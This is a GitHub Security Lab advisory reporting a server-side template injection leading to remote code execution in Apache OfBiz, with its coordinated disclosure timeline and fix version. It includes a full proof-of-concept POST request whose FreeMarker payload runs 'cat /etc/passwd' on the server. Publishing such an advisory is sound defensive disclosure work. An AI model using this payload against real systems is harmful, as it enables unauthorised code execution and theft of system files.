<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">January 26, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-070: Server-Side Template Injection (SSTI) leading to Remote Code Execution (RCE) in Apache OfBiz</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>04/13/2020: Report sent to vendor.</li>
  <li>04/23/2020: OfBiz maintainer acknowledges the issue.</li>
  <li>04/23/2020: As per Apache policy, no CVE will be issued for post-authentication vulnerabilities no matter if they are privilege escalations or XSS issues (including this one that can be triggered via XSS reported in GHSL-2020-068)</li>
  <li>01/10/2021: Addressed in 17.12.05</li>
</ul>

<h2 id="summary">Summary</h2>
<p>Apache OfBiz is vulnerable to Server-Side Template Injection (SSTI) leading to Remote Code Execution (RCE)</p>

<h2 id="product">Product</h2>
<p>Apache Ofbiz</p>

<h2 id="tested-version">Tested Version</h2>
<p>17.12.01</p>

<h2 id="details">Details</h2>

<h3 id="server-side-template-injection-through-content-templates">Server-Side Template Injection through Content templates</h3>

<p>A user with privileges to edit <a href="https://demo-stable.ofbiz.apache.org/content/control/EditLayoutSubContent?mode=add&amp;contentIdTo=TEMPLATE_MASTER">Content Manager templates</a>, can use the UI or a direct POST request to get a FreeMarker template evaluated. For example, the example below will run the <code class="language-plaintext highlighter-rouge">cat /etc/passwd</code> command and will return its contents:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /content/control/createLayoutSubContent HTTP/1.1
Host: demo-stable.ofbiz.apache.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 187
Connection: close
Cookie: JSESSIONID=9697AC85B262C213DEA0A548939118F6.jvm1;

contentTypeId=DOCUMENT&amp;contentIdTo=TEMPLATE_MASTER&amp;drDataResourceTypeId=ELECTRONIC_TEXT&amp;drDataTemplateTypeId=FTL&amp;textData=${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>This issue leads to <code class="language-plaintext highlighter-rouge">Remote Code Execution</code></p>

<h2 id="cve">CVE</h2>
<p>Not assigned</p>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Muñoz)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include the <code class="language-plaintext highlighter-rouge">GHSL-2020-070</code> in any communication regarding this issue.</p>

   